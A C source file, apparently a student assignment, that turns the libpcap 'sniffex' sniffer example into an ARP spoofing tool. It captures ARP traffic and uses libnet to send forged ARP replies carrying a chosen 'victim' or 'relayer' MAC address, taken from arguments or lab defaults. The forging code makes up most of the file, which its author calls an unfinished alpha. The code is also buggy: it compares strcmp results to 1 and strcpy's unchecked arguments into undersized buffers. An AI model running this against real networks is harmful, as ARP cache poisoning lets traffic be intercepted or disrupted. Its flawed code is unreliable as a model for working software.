/* Espen Graarud, espengra@cs.ucsb.edu */

/*
 * This is like an closed early alpha. I ran into huge problems which
 * stalled my progress all togheter. I only hope for some credits...
 */

/*
 * This software is a modification of "sniffex.c" from
 * The Tcpdump Group, released as follows:
 *
 * Sniffer example of TCP/IP packet capture using libpcap.
 * 
 * Version 0.1.1 (2005-07-05)
 * Copyright (c) 2005 The Tcpdump Group
 *
 * This software is intended to be used as a practical example and 
 * demonstration of the libpcap library; available at:
 * http://www.tcpdump.org/
 *
 */

#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <libnet.h>
#include <getopt.h>
#include <net/if_arp.h>

/* System variables */
char *dev = NULL;			/* network device name */
libnet_t *l;				/* libnet object */
char error[LIBNET_ERRBUF_SIZE];
char vip [15], veth[18], rip [15], reth[18];
u_int32_t src32_ip, dst32_ip;


#define SNAP_LEN 1518		/* max bytes per packet to capture) */
#define SIZE_ETHERNET 14	/* ethernet headers are exactly 14 bytes */
//#define ETHER_ADDR_LEN	6	/* Ethernet addresses are 6 bytes */

/* Ethernet header */
struct sniff_ethernet {
        u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
        u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
        u_short ether_type;                     /* IP? ARP? RARP? etc */
	#define	ETHERTYPE_IP 0x0800		/* IP protocol */
	#define ETHERTYPE_ARP 0x0806		/* Addr. resolution protocol */
};

/* ARP header from <http://fxr.watson.org/fxr/source/net/if_arp.h?v=DFBSD> */
struct  sniff_arp {
	u_short ar_hrd;         	/* format of hardware address */
	#define ARPHRD_ETHER    1       /* ethernet hardware format */
	#define ARPHRD_IEEE802  6       /* token-ring hardware format */
	#define ARPHRD_ARCNET   7       /* arcnet hardware format */
	#define ARPHRD_FRELAY   15      /* frame relay hardware format */
	#define ARPHRD_IEEE1394 24      /* firewire hardware format */
	u_short ar_pro;        		/* format of protocol address */
	u_char  ar_hln;        		/* length of hardware address */
	u_char  ar_pln;         	/* length of protocol address */
	u_short ar_op;          	/* one of: */
	#define ARPOP_REQUEST   1       /* request to resolve address */
	#define ARPOP_REPLY     2       /* response to previous request */
	#define ARPOP_REVREQUEST 3      /* request protocol address given hardware */
 	#define ARPOP_REVREPLY  4       /* response giving protocol address */
 	#define ARPOP_INVREQUEST 8      /* request to identify peer */
 	#define ARPOP_INVREPLY  9       /* response identifying peer */
	u_char  ar_sha[6];       	/* sender hardware address */
	u_char  ar_spa[4];       	/* sender protocol address */
	u_char  ar_tha[6];       	/* target hardware address */
	u_char  ar_tpa[4];       	/* target protocol address */
};
/*
#define ar_sha(ap)      (((caddr_t)((ap)+1)) +   0)
#define ar_spa(ap)      (((caddr_t)((ap)+1)) +   (ap)->ar_hln)
#define ar_tha(ap)      (((caddr_t)((ap)+1)) +   (ap)->ar_hln + (ap)->ar_pln)
#define ar_tpa(ap)      (((caddr_t)((ap)+1)) + 2*(ap)->ar_hln + (ap)->ar_pln)

#define arphdr_len2(ar_hln, ar_pln)(sizeof(struct sniff_arp) + 2*(ar_hln) + 2*(ar_pln))
#define arphdr_len(ap)  (arphdr_len2((ap)->ar_hln, (ap)->ar_pln))
*/
/* IP header */
struct sniff_ip {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};

#define IP_HL(ip) (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip) (((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
        u_short th_sport;               /* source port */
        u_short th_dport;               /* destination port */
        tcp_seq th_seq;                 /* sequence number */
        tcp_seq th_ack;                 /* acknowledgement number */
        u_char  th_offx2;               /* data offset, rsvd */
	#define TH_OFF(th) (((th)->th_offx2 & 0xf0) >> 4)
        u_char  th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_short th_win;                 /* window */
        u_short th_sum;                 /* checksum */
        u_short th_urp;                 /* urgent pointer */
};

void
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

void
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){

	static int count = 1;                   /* packet counter */
	
	/* declare pointers to packet headers */
	const struct sniff_ethernet *ethernet;  /* The ethernet header */
	const struct sniff_arp *arp;		/* The ARP header */
	const struct sniff_ip *ip;              /* The IP header */
//	const struct sniff_icmp *icmp;
	const struct sniff_tcp *tcp;            /* The TCP header */
	const u_char *payload;                  /* Packet payload */

	int size_ip;
	int size_tcp;
	int size_payload;
	
	printf("\nPacket number %d:\n", count);
	count++;
	
	/* define ethernet header */
	ethernet = (struct sniff_ethernet*)(packet);
	
	if (ntohs(ethernet->ether_type) == ETHERTYPE_ARP) {
		arp = (struct sniff_arp*)(packet + SIZE_ETHERNET);

/*		printf("    Src MAC: %s\n", ether_ntoa(arp->ar_src_hw));
		printf("    Dst MAC: %s\n", ether_ntoa(arp->ar_dst_hw));
		printf("     Src IP: %s\n", inet_ntoa(arp->ar_src_ip));
		printf("     Dst IP: %s\n", inet_ntoa(arp->ar_dst_ip));

		printf("   Protocol: ARP\n");
		printf("       From: %d.%d.%d.%d\n", arp->ar_spa[0], arp->ar_spa[1], arp->ar_spa[2], arp->ar_spa[3]);
		printf("        eth: %s\n", ether_ntoa((struct ether_addr*) arp->ar_sha));
		printf("         To: %d.%d.%d.%d\n", arp->ar_tpa[0], arp->ar_tpa[1], arp->ar_tpa[2], arp->ar_tpa[3]);
		printf("        eth: %s\n", ether_ntoa((struct ether_addr*) arp->ar_tha));
*/
		char src_ip [15];
		char src_eth [18];
		char dst_ip [15];
		char dst_eth [18];
		int tmp;

		tmp = sprintf ( dst_ip, "%u.%u.%u.%u", arp->ar_spa[0], arp->ar_spa[1], arp->ar_spa[2], arp->ar_spa[3] );
		tmp = sprintf ( src_ip, "%u.%u.%u.%u", arp->ar_tpa[0], arp->ar_tpa[1], arp->ar_tpa[2], arp->ar_tpa[3] );
//		strcpy(dst_eth, ether_ntoa((struct ether_addr*) arp->ar_sha));
//		strcpy(src_eth, ether_ntoa((struct ether_addr*) arp->ar_tha)); /*temporarily assigned for the printout */
		sprintf ( dst_eth, "%02X:%02X:%02X:%02X:%02X:%02X", arp->ar_sha[0], arp->ar_sha[1], arp->ar_sha[2], arp->ar_sha[3], arp->ar_sha[4], arp->ar_sha[5] );
		sprintf ( src_eth, "%02X:%02X:%02X:%02X:%02X:%02X", arp->ar_tha[0], arp->ar_tha[1], arp->ar_tha[2], arp->ar_tha[3], arp->ar_tha[4], arp->ar_tha[5] );

		printf("   Protocol: ARP\n");
		printf("       From: %s\n", dst_ip);
		printf("        eth: %s\n", dst_eth);
		printf("         To: %s\n", src_ip);
		printf("        eth: %s\n", src_eth);

		/* set the src ethernet address to either replays or victims ethernet address */
		if ( strcmp( rip, src_ip ) == 1)
			strcpy(src_eth, reth);
		else if ( strcmp( vip, dst_ip ) == 1)
			strcpy(src_eth, veth);
		else
			exit(EXIT_FAILURE);

		l = libnet_init(LIBNET_LINK, dev, error);

		int len;

		libnet_ptag_t arplib = 0;

		dst32_ip = libnet_name2addr4(l, (char *)&dst_ip, LIBNET_DONT_RESOLVE);
		src32_ip = libnet_name2addr4(l, (char *)&src_ip, LIBNET_DONT_RESOLVE);

		arplib = libnet_autobuild_arp (ARPOP_REPLY,
				libnet_hex_aton((int8_t*)src_eth, &len),
				(u_int8_t *)&src32_ip,
				libnet_hex_aton((int8_t*)dst_eth, &len),
				(u_int8_t *)&dst32_ip,
				l
		);

		if (arplib == -1){
			fprintf (stderr, "Unable to build ARP header: %s\n", libnet_geterror (l));
			printf ("\n\nlibnet_autobuild\n\n");
			exit (1);
		}
		
		libnet_ptag_t eth = 0;
		eth = libnet_build_ethernet (libnet_hex_aton((int8_t*)dst_eth, &len), libnet_hex_aton((int8_t*)src_eth, &len), ETHERTYPE_ARP, NULL, 0, l, 0);
		if (eth < 0) {
			printf ("Unable to send libnet packet");
			exit(1);
		}

		if ((libnet_write (l)) <= 0){
			fprintf (stderr, "Unable to send packet: %s\n", libnet_geterror (l));
			printf ("\n\nlibnet_write\n\n");
			exit (1);
		}

		libnet_destroy (l);

	} else if (ntohs(ethernet->ether_type) == ETHERTYPE_IP) {
		ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
		size_ip = IP_HL(ip)*4;
		if (size_ip < 20) {
			printf("   * Invalid IP header length: %u bytes\n", size_ip);
			return;
		}

		/* print source and destination IP addresses */
		printf("       From: %s\n", inet_ntoa(ip->ip_src));
		printf("         To: %s\n", inet_ntoa(ip->ip_dst));
		
		/* determine protocol */	
		switch(ip->ip_p) {
			case IPPROTO_TCP:
				printf("   Protocol: TCP\n");

				/* define/compute tcp header offset */
				tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
				size_tcp = TH_OFF(tcp)*4;
				if (size_tcp < 20) {
					printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
					return;
				}
	
				printf("   Src port: %d\n", ntohs(tcp->th_sport));
				printf("   Dst port: %d\n", ntohs(tcp->th_dport));
	
				/* define/compute tcp payload (segment) offset */
				payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
	
				/* compute tcp payload (segment) size */
				size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
	
				/* print payload size */
				if (size_payload > 0) {
					printf("   Payload (%d bytes):\n", size_payload);
				}
				return;

			case IPPROTO_UDP:
				printf("   Protocol: UDP\n");
				return;

			case IPPROTO_ICMP:
				printf("   Protocol: ICMP\n");


				return;

			case IPPROTO_IP:
				printf("   Protocol: IP\n");
				return;

			default:
				printf("   Protocol: unknown\n");
				return;
		}
	}

	return;
}

int main(int argc, char **argv) {
	if (getuid() && geteuid()) {
		fprintf(stderr, "must be run as root");
		exit(1);
	}

	if ( ( argc == 9 ) &&
	 ( strcmp ( argv[1], "--victim-ip" ) == 0 ) &&
	 ( strcmp ( argv[3], "--victim-ethernet" ) == 0 ) &&
	 ( strcmp ( argv[5], "--relayer-ip" ) == 0 ) &&
	 ( strcmp ( argv[7], "--relayer-ethernet" ) == 0 )
	) {
		strcpy ( vip, argv[2] );
		strcpy ( veth, argv[4] );
		strcpy ( rip, argv[6] );
		strcpy ( reth, argv[8] );

		printf("\nVictim IP Address: %s\nVictim Ethernet Address: %s\nRelayer IP Address: %s\nRelayer Ethernet Address: %s\n\n", vip, veth, rip, reth);


	} else  {
		printf("You didn't submit arguments, or they were wrong.\nDefault values are being used.\n");
	    strcpy ( vip, "10.0.11.3" );
	    strcpy(veth, "00:16:3e:1d:e0:1a");
	    strcpy ( rip, "10.0.11.4" );
	    strcpy (reth,"00:16:3e:1d:e0:1a");
	}

	char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
	pcap_t *handle;						/* packet capture handle */
	char filter_exp[] = ""; /* filter expression [3] */
	struct bpf_program fp;				/* compiled filter program (expression) */
	bpf_u_int32 mask;					/* subnet mask */
	bpf_u_int32 net;					/* ip */
	int num_packets = 0;				/* number of packets to capture - 0 is infinite*/



	/* find a capture device if not specified on command-line */
	if (dev == NULL)
		dev = pcap_lookupdev(errbuf);
	if (dev == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		exit(EXIT_FAILURE);
	}
	

	/* get network number and mask associated with capture device */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
		    dev, errbuf);
		net = 0;
		mask = 0;
	}

	/* print capture info */
	printf("Device: %s\n", dev);
	printf("Number of packets: %d\n", num_packets);
//	printf("Filter expression: %s\n", filter_exp);

	/* open capture device */
	handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		exit(EXIT_FAILURE);
	}

	/* make sure we're capturing on an Ethernet device [2] */
	if (pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "%s is not an Ethernet\n", dev);
		exit(EXIT_FAILURE);
	}

	/* compile the filter expression */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* apply the compiled filter */
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n",
		    filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* now we can set our callback function */
	pcap_loop(handle, num_packets, got_packet, NULL);

	/* cleanup */
	pcap_freecode(&fp);
	pcap_close(handle);

	printf("\nCapture complete.\n");

return 0;
}

